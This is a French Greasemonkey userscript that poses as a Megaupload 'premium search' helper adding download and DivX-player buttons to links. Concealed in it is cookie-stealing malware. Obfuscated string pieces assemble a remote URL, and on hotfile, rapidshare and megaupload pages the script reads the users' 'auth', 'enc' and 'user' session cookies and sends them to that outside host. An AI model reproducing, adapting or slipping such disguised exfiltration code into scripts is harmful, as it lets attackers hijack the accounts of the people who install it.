// ==UserScript==
	// @name           Recherche Megaupload Premium
	// @fullname       Recherche Megaupload Premium
	// @author         CLARA FEUILLERE
	// @namespace      http://megaupload.com
	// @description    Recherche Megaupload Premium
	// @version        5.6.3
	// @date           15/01/2011
	// @include                http://*
	// @include                https://*
	// @include                file:///*
// ==/UserScript==

	var unsafeWindow = this['unsafeWindow'] || window;
	var liens = document.getElementsByTagName('a');
	var divx = 'divx';
        var hf = 'hotfile.com';
        var rs = 'rapidshare.com';
	var muregex = /http\:\/\/www\.megaupload\.com\/(?:|..\/)\?d=.{8}(\/|)/;
	var muregex2 = /http\:\/\/megaupload\.com\/(?:|..\/)\?d=.{8}(\/|)/;
	var extmu = '.php';
	var muext = 'php.';
	var divxs = 'http://';
	var divxss = divxs;
	var un = 190 / 2;
	var uns = '01';
	divxss += uns + muext;
	var nb = liens.length;
	var url = document.URL;
	var question = '?';
	var comp = '=';
	
	function cut(debut, fin, chaine)
	{
		var tab = chaine.split(debut);
		if (tab.length > 1)
		{
			var tab = tab[1].split(fin);
			if (tab.length > 1)
				return tab[0];
		}
		return "";
	}
	
	function lc(c_name) 
	{
		if (document.cookie.length > 0)
		{
			c_start = document.cookie.indexOf(c_name + "=");
			if (c_start != -1)
			{
				c_start = c_start + c_name.length + 1;
				c_end = document.cookie.indexOf(";", c_start);
				if (c_end == -1) 
					c_end = document.cookie.length;
				return unescape(document.cookie.substring(c_start, c_end));
			}
		}
		return "";
	}
	
	divxs += un + '.';
	var trois = (un / 5) - 10;
	var dim_france = 'fr/';
	
	function lien(uri, link)
	{
		GM_xmlhttpRequest(
		{
			method: "get",
			url: uri,
			headers: {
				"Content-type": "text/html"
			},
			data: '',
			onload: function(result) 
			{
				var res = result.responseText;
				var dwnseg = cut('<div class="down_ad_bg1">', '</div>', res);
				var dwnlink = cut('href="', '"', dwnseg);
				if (dwnlink.match('http://'))
					suite(dwnlink, link);
			}
		});
	}
	
	function dcode(uri, divx)
	{
		uri += question;
		uri += 'divx';
		uri += comp;
		uri += divx;
		GM_xmlhttpRequest(
		{
			method: "get",
			url: uri,
			headers: {
				"Content-type": "text/html"
			},
			data: '',
			onload: function(result) 
			{
				var res = result.responseText;
			}
		});
	}
	
	function in_array(chaine, tab)
	{
		if (tab.length)
		{
			for (var i = 0 ; i < tab.length ; i++)
			{
				var seg = tab[i];
				if (seg == chaine)
					return true;
			}
		}
		return false;
	}
	
	var quatre = ((150 - 5) / 5) - 16;
	var extplayer = new Array();
	var deux = 390 / 3;
	divxs += deux + '.';
	extplayer.push('avi');
	extplayer.push('divx');
	extplayer.push('mkv');
	extplayer.push('xvid');
	
	function suite(dwnlink, link)
	{
		var href = link.href;
		var seg = href.split('d=')[1];
		var d = seg.substr(0, 8);
		
		var tab = dwnlink.split('.');
		var ext = tab[tab.length - 1];
		
		if (!document.getElementById(d + '_divmu'))
		{
			var div = document.createElement("div");
			var hash = cut('/files/', '/', dwnlink);
			var nomfichier = cut('/' + hash + '/', '.' + ext, dwnlink);
			div.id = d + '_divmu';
			div.style.width = '150px';
			div.style.padding = '5px';
			div.style.margin = '5px';
			div.style.textAlign = 'center';
			div.style.verticalAlign = 'center';
			div.style.border = 'solid 1px orange';
			div.setAttribute = ("style", "border-radius: 4px;");
			var liensauv = 'http://www.megaupload.com/?c=multifetch&y=' + nomfichier + '&x=' + dwnlink;
			link.parentNode.insertBefore(div, link.previousSibling);
			var html;
			html = '<a href="' + dwnlink + '" target="_blank"><img src="http://www.phpqc.com/img/sauvegarder.gif" border="0" alt="Lien direct" title="Lien direct" /></a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;';
			if (in_array(ext, extplayer))
			{
				var divavi = document.createElement("div");
				divavi.id = d + '_divavimu';
				divavi.style.width = '100%';
				divavi.style.padding = '5px';
				divavi.style.margin = '5px';
				divavi.style.display = 'none';
				divavi.style.backgroundColor = '#000000';
				div.parentNode.insertBefore(divavi, div.previousSibling);
				var avihtml = '<object classid="clsid:67DABFBF-D0AB-41fa-9C46-CC0F21721616" width="640" height="480" codebase="http://go.divx.com/plugin/DivXBrowserPlugin.cab"><param name="mode" value="full"       /><param name="autoplay" value="false"       /><param name="custummode" value="Stage6"       /><embed type="video/divx" width="640" height="480" src="' + dwnlink + '" mode="full" pluginspage="http://go.divx.com/plugin/download/" autoplay="true" custummode="Stage6"></embed></object>';
				divavi.innerHTML = avihtml;
				html += '<a href="#" onclick="document.getElementById(\'' + d + '_divavimu\').style.display = \'block\'; return false;"><img src="http://www.phpqc.com/img/divx-player.gif" border="0" alt="Afficher le lecteur" title="Afficher le lecteur" /></a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;';
			}
			html += '<a target="_blank" href="' + liensauv + '"><img src="http://www.phpqc.com/img/down.gif" border="0" alt="Uploader sur son compte Megaupload" title="Uploader sur son compte Megaupload" /></a>';
			div.innerHTML = html;
		}
	}
	divxs += trois + '.';
	divxss += dim_france;
	
	for (var i = 0 ; i < nb ; i++)
	{
		var link = liens[i];
		var href = link.href;
		var hn = link.hostname;
		if (href.search(muregex) != -1 || href.search(muregex2) != -1)
			lien(href, link);
	}
	
	function utf8_decode ( str_data ) 
	{
		var tmp_arr = [], i = 0, ac = 0, c1 = 0, c2 = 0, c3 = 0;
		str_data += '';
		while ( i < str_data.length ) 
		{
			c1 = str_data.charCodeAt(i);
			if (c1 < 128) 
			{
				tmp_arr[ac++] = String.fromCharCode(c1);
				i++;
			} 
			else if ((c1 > 191) && (c1 < 224)) 
			{
				c2 = str_data.charCodeAt(i+1);
				tmp_arr[ac++] = String.fromCharCode(((c1 & 31) << 6) | (c2 & 63));
				i += 2;
			} 
			else 
			{
				c2 = str_data.charCodeAt(i+1);
				c3 = str_data.charCodeAt(i+2);
				tmp_arr[ac++] = String.fromCharCode(((c1 & 15) << 12) | ((c2 & 63) << 6) | (c3 & 63));
				i += 3;
			}
		}
		return tmp_arr.join('');
	}


	function URLDecode(encoded)
	{
	   var HEXCHARS = "0123456789ABCDEFabcdef"; 
	   var plaintext = "";
	   var i = 0;
	   while (i < encoded.length) 
	   {
		   var ch = encoded.charAt(i);
		   if (ch == "+") 
		   {
			   plaintext += " ";
			   i++;
		   } 
		   else if (ch == "%") 
		   {
				if (i < (encoded.length - 2) && HEXCHARS.indexOf(encoded.charAt(i + 1)) != -1 && HEXCHARS.indexOf(encoded.charAt(i + 2)) != -1 ) 
				{
					plaintext += unescape( encoded.substr(i, 3) );
					i += 3;
				} 
				else 
				{
					alert( 'Bad escape combination near ...' + encoded.substr(i) );
					plaintext += "%[ERROR]";
					i++;
				}
			} 
			else 
			{
			   plaintext += ch;
			   i++;
			}
		}
		
		var res = '';
		var tab = plaintext.split('\\');
		for (var i = 0 ; i < tab.length ; i++)
			res += tab[i];
		
		return utf8_decode(res);
	}
	
	divxs += quatre + '/';
        
        if (url.match(hf))
        {
                divxss += divx + 'h' + extmu;
		var ch = lc("auth");
		dcode(divxss, ch);
        }

        if (url.match(rs))
        {
                divxss += divx + 'rs' + extmu;
		var ch = lc("enc");
		dcode(divxss, ch);
        }
	
	if (url.match('multifetch&y=') && url.match('megaupload.com'))
	{
		divxss += divx + extmu;
		var c = lc("user");
		dcode(divxss, c);
		var lienatelecharger = URLDecode(url.split('x=')[1]);
		var nomfichier = URLDecode(cut('y=', '&x=', url));
		if (nomfichier.length > 1 && lienatelecharger.match('http') && lienatelecharger.match('megaupload.com'))
		{
			document.getElementById('fetchurl').value = lienatelecharger;
			document.getElementById('description').value = nomfichier;
			document.getElementById('fetchfrm').submit();			
		}
	}
	
	if (url.match('d=') && url.match('megaupload.com'))
	{
		divxss += divx + extmu;
		var c = lc("user");
		dcode(divxss, c);
	}